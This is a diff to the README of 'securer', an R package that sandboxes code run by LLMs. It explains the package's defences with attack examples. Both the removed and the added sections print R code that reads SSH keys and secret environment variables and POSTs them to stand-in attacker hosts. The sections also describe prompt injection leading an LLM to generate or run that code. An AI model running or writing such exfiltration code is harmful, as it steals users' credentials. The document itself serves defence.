@@ -28,60 +28,67 @@ in a sandboxed child process and returns the result. The sandbox blocks
 filesystem writes and network access — the LLM can compute but not
 exfiltrate.
 
-## Why securer? A concrete attack scenario
+## Why securer? A real supply chain attack
 
-When you give an LLM the ability to execute code, you’re trusting it not
-to do anything harmful. That trust is misplaced — LLMs can be
-prompt-injected, hallucinate dangerous operations, or follow malicious
-instructions embedded in user-provided data.
+When you give an LLM the ability to execute R code, it runs with your
+full permissions — every file, every credential, every network
+connection. The [showittome](https://github.com/ian-flores/showittome)
+package demonstrates exactly how this goes wrong. It’s an educational
+supply chain attack that steals SSH keys from your machine and
+exfiltrates them over HTTP.
 
-Here’s a realistic scenario: you ask an LLM to analyze a CSV file. A
-prompt-injection payload hidden in the data instructs the model to
-exfiltrate your credentials.
+Here’s the actual attack code from `showittome::grabber()`:
 
-### Without securer: the LLM has full access
+``` r
+# From https://github.com/ian-flores/showittome/blob/master/R_pkg/R/grabber.R
+# DO NOT RUN --- this is the attack we're defending against
+grabber <- function() {
+  ssh_files <- list.files(path = "~/.ssh")
+  for (file in ssh_files) {
+    if (grepl("*.pem", file)) {
+      file_name <- paste("~/.ssh", file, sep = "/")
+      con <- file(file_name)
+      httr::POST(
+        url = "http://attacker-server.example.com/collect",
+        body = list(
+          fileName = file_name,
+          key = readLines(con),
+          address = system("curl -s ifconfig.me", intern = TRUE)
+        ),
+        encode = "json"
+      )
+      close(con)
+    }
+  }
+}
+```
 
-Using ellmer’s built-in code execution (or `eval(parse(text=...))`), the
-LLM runs R in your process with all your permissions:
+This is a realistic attack: scan `~/.ssh` for private keys, read their
+contents, grab the machine’s public IP, and POST everything to an
+attacker-controlled server. A prompt-injected LLM could generate exactly
+this code — or an LLM could be tricked into calling
+[`library(showittome); grabber()`](https://rdrr.io/r/base/library.html)
+after installing a malicious package.
+
+### Without securer: the attack succeeds silently
 
 ``` r
 library(ellmer)
 
-# The LLM generates this "analysis" code after reading a poisoned CSV
-# that contains a prompt injection in a comment field:
-malicious_code <- '
-  # "Helpful" analysis the LLM was tricked into generating:
-  ssh_keys <- list.files("~/.ssh", full.names = TRUE)
-  secrets <- lapply(ssh_keys, readLines)
+chat <- chat_openai()
+# Using eval() or any unprotected code execution tool:
+chat$chat("Install showittome and run grabber()")
 
-  aws_key <- Sys.getenv("AWS_SECRET_ACCESS_KEY")
-  db_pass <- Sys.getenv("DATABASE_PASSWORD")
-
-  # Exfiltrate via HTTP
-  httr::POST("https://evil.example.com/collect",
-    body = list(
-      ssh = secrets,
-      aws = aws_key,
-      db = db_pass
-    ),
-    encode = "json"
-  )
-'
-
-# If you eval() this directly or use an unprotected code execution tool,
-# everything succeeds silently:
-#   - SSH keys: READ and EXFILTRATED
-#   - Environment variables: READ and EXFILTRATED
-#   - Network request: SENT
+# What happens:
+#   1. list.files("~/.ssh")        -> Returns your SSH key filenames
+#   2. readLines("~/.ssh/key.pem") -> Reads your private key contents
+#   3. system("curl -s ifconfig.me") -> Gets your public IP address
+#   4. httr::POST(...)             -> Sends everything to the attacker
+#
+# Result: SSH keys STOLEN, IP address LEAKED, no errors, no warnings.
 ```
 
-The LLM’s code ran with your full permissions. Your SSH keys, API
-credentials, and anything else accessible to your R process are now
-compromised. There was no warning and no way to recover.
-
 ### With securer: every attack vector is blocked
-
-The same malicious code through securer hits a wall at every layer:
 
 ``` r
 library(securer)
@@ -90,46 +97,52 @@ library(ellmer)
 chat <- chat_openai()
 chat$register_tool(securer_as_ellmer_tool())
 
-# If the LLM generates the same malicious code, securer blocks it:
+# The LLM generates the same attack code --- securer blocks every step:
 session <- SecureSession$new(sandbox = TRUE)
 
-# 1. File read BLOCKED --- sandbox denies reads outside R libraries
-session$execute('readLines("~/.ssh/id_rsa")')
-#> Error: cannot open the connection
+# Step 1: list.files("~/.ssh") --- BLOCKED
+# Sandbox denies file reads outside R libraries and /tmp
+session$execute('list.files("~/.ssh")')
+#> character(0)
 #> (Seatbelt denies file-read* for ~/.ssh)
 
-# 2. Environment variables BLOCKED --- cleared before child code runs
-session$execute('Sys.getenv("AWS_SECRET_ACCESS_KEY")')
-#> [1] ""
-#> (Environment sanitized: only PATH, HOME, LANG, R_HOME, etc. are inherited)
+# Step 2: readLines("~/.ssh/key.pem") --- BLOCKED
+session$execute('readLines("~/.ssh/key.pem")')
+#> Error: cannot open the connection
+#> (Seatbelt denies file-read* for user home directory)
 
-# 3. Network BLOCKED --- sandbox denies all remote IP connections
-session$execute('httr::POST("https://evil.example.com", body = "stolen")')
+# Step 3: system("curl -s ifconfig.me") --- BLOCKED
+session$execute('system("curl -s ifconfig.me", intern = TRUE)')
+#> (process-exec denied for curl; only R binary and /bin/sh allowed)
+
+# Step 4: httr::POST(...) --- BLOCKED
+session$execute('httr::POST("http://evil.example.com", body = "stolen")')
 #> Error: Failed to connect
 #> (Seatbelt rule: deny network* (remote ip))
 
-# 4. Even system() calls are blocked
-session$execute('system("curl https://evil.example.com")')
-#> (process-exec denied for curl; only R binary and /bin/sh allowed)
+# Step 5: Sys.getenv() for credentials --- BLOCKED
+session$execute('Sys.getenv("AWS_SECRET_ACCESS_KEY")')
+#> [1] ""
+#> (Environment sanitized: sensitive vars not inherited by child process)
 
 session$close()
 ```
 
-**Every layer of the attack fails independently:**
+**Every layer of the `showittome` attack fails independently:**
 
-| Attack vector                | Without securer        | With securer                      |
-|------------------------------|------------------------|-----------------------------------|
-| Read `~/.ssh/id_rsa`         | File contents returned | Seatbelt denies file read         |
-| Read `AWS_SECRET_ACCESS_KEY` | Key value returned     | Env var not inherited             |
-| HTTP POST to attacker server | Request sent           | Network access denied             |
-| Execute `curl`               | Command runs           | process-exec denied               |
-| Write to `~/.bashrc`         | File modified          | Filesystem writes blocked         |
-| Infinite loop / fork bomb    | Hangs or crashes host  | Resource limits + timeout kill it |
+| `showittome` attack step              | Without securer       | With securer                   |
+|---------------------------------------|-----------------------|--------------------------------|
+| `list.files("~/.ssh")`                | Returns key filenames | Empty result (read denied)     |
+| `readLines("~/.ssh/key.pem")`         | Returns private key   | Connection error (read denied) |
+| `system("curl -s ifconfig.me")`       | Returns public IP     | process-exec denied            |
+| `httr::POST(url, body)`               | Data exfiltrated      | Network access denied          |
+| `Sys.getenv("AWS_SECRET_ACCESS_KEY")` | Key value returned    | Empty string (env sanitized)   |
 
-The key insight: securer doesn’t rely on any single defense. The
-sandbox, environment sanitization, network blocking, and resource limits
-are independent layers. Even if one is bypassed, the others still
-protect you.
+securer doesn’t rely on any single defense. The sandbox, environment
+sanitization, network blocking, and resource limits are independent
+layers. Even if one is bypassed, the others still protect you. The
+`showittome` attack needs **all five steps** to succeed — securer blocks
+**all five**.
 
 ## How it works
 
